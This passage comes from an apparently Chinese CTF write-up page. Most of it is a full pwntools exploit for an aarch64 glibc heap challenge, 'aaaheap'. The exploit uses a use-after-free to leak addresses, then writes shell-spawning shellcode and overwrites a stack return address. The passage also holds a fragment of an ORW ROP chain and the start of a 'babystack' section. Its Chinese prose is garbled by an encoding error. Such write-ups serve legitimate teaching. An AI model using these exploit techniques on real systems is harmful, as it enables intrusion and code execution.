</span></span><span class=line><span class=cl><span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>*</span><span class=n>m</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>orw_rop</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/flag&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>orw_rop</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;select: &#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#sl(&#39;1&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;rs): &#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#sl(pwd)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#edit(0,0xFFF00000078,&#39;hack&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#ru(b&#39;select: &#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#sl(&#39;1&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#ru(b&#39;Please enter old password for verification: &#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#sl(pwd)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#add(0x10FFFFFF8)</span>
</span></span><span class=line><span class=cl><span class=c1>#edit(4,0x2FFFFFFFF,&#39;hah&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#rm(0)</span>
</span></span><span class=line><span class=cl><span class=c1>#add(0x7fffffff)</span>
</span></span><span class=line><span class=cl><span class=c1>#edit(0,0xffffffff,y=0)</span>
</span></span><span class=line><span class=cl><span class=c1>#rm(1)</span>
</span></span><span class=line><span class=cl><span class=c1>#dit(1,0x58,b&#39;B&#39;*0x58)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay = flat({</span>
</span></span><span class=line><span class=cl><span class=c1>#},filler=b&#39;\x00&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># libc.address = libc_base</span>
</span></span><span class=line><span class=cl><span class=c1># system = libc.sym[&#39;system&#39;]</span>
</span></span><span class=line><span class=cl><span class=c1># bin_sh = next(libc.search(b&#39;/bin/sh&#39;))</span>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=aaaheap>aaaheap</h2><p>ARM aarch64 æ¶æ„ä¸‹çš„ä¸€ä¸ª glibc å †ä½“é¢˜ç›®ï¼ŒUAF æ¼æ´ï¼Œ heap list ä¹Ÿåœ¨ heap ä¸Š,UAF æ„é€ ä»»æ„åœ°å€ç”³è¯·åˆ°heapliståæ—¢å¯ä»¥ä»»æ„åœ°å€è¯»å†™ï¼Œåé¢æŠŠ shellcodeå†™åˆ° heapä¸Š ç„¶åä¿®æ”¹ stack ä¸Šçš„è¿”å›åœ°å€ï¼Œ ret2shellcode</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;1.1.11 123&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./vuln&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=s1>&#39;qemu-aarch64-static -L ./lib/ ./vuln&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#cmd = &#39;qemu-aarch64-static -g 1234 -L ./lib/ ./vuln&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span><span class=o>=</span><span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(&#34;pwn-e45167b3ab.challenge.xctf.org.cn&#34;, 9999, ssl=True)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-7ad75533cf.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index : &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Size: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;data: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>key</span> <span class=o>&lt;&lt;</span> <span class=mh>0xC</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;heap_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./lib/lib/libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>((</span><span class=n>heap_base</span><span class=o>-</span><span class=mh>0x90</span><span class=p>)</span> <span class=o>^</span> <span class=n>key</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>-</span><span class=mh>0xF0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf_base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x2688</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;elf_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t2</span> <span class=o>=</span> <span class=n>elf_base</span> <span class=o>+</span> <span class=mh>0x15F28</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>t2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t3</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;environ&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>t3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t4</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>-</span> <span class=mh>0x150</span>
</span></span><span class=line><span class=cl><span class=n>t4</span> <span class=o>=</span> <span class=n>stack</span> <span class=o>-</span> <span class=mh>0x218</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>t4</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;7&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x1c0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#target = heap_base + 0x1c0</span>
</span></span><span class=line><span class=cl><span class=c1>#add(4,0x80)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay = p64(target+8)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += b&#39;/bin/sh\x00&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += b&#39;/bin/sh\x00&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += b&#39;/bin/sh\x00&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p64(target+8)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p64(libc.sym[&#39;system&#39;])</span>
</span></span><span class=line><span class=cl><span class=c1>#edit(4,pay)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>##pay  = b&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>##pay += p64(target)</span>
</span></span><span class=line><span class=cl><span class=c1>##pay += asm(shellcraft.sh())</span>
</span></span><span class=line><span class=cl><span class=c1>##edit(0,pay)</span>
</span></span><span class=line><span class=cl><span class=c1>##print(n)</span>
</span></span><span class=line><span class=cl><span class=c1>##pause()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#add(4,0x78)</span>
</span></span><span class=line><span class=cl><span class=c1>#add(5,0x78)</span>
</span></span><span class=line><span class=cl><span class=c1>#rm(4)</span>
</span></span><span class=line><span class=cl><span class=c1>#rm(5)</span>
</span></span><span class=line><span class=cl><span class=c1>#edit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#rm(0)</span>
</span></span><span class=line><span class=cl><span class=c1>#rm(1)</span>
</span></span><span class=line><span class=cl><span class=c1>#show(0)</span>
</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;Data: &#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#key = uu64(r(6))</span>
</span></span><span class=line><span class=cl><span class=c1>#heap_base = key &lt;&lt; 0xC</span>
</span></span><span class=line><span class=cl><span class=c1>#lss(&#39;heap_base&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=babystack>babystack</h2><p>ç¨‹åºé€»è¾‘å¦‚ä¸‹ï¼Œå¯ä»¥é€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥å°†n180097847è¦†ç›–ï¼Œç„¶åç›´æ¥getshell</p><p><img src=/img/2025-QWNT/49.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
